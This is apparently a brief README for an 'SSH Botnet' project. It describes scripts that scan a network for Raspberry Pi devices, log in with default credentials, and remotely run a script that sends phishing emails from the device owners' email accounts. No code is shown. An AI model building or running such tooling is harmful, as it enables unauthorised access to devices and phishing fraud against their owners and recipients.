To run SSH Botnet program:
python3 sshbotnet.py

ping.sh: Scans network for raspberry pi with hostname: raspberrypi
target.txt: Stores ip address of discovered raspberry pi from ping.sh
start.sh: Automatically login to raspberry pi with default credentials and remote executes botnet.sh
botnet.sh: Runs remotely on raspberry pi to send out phishing emails from raspberry pi user's email account.
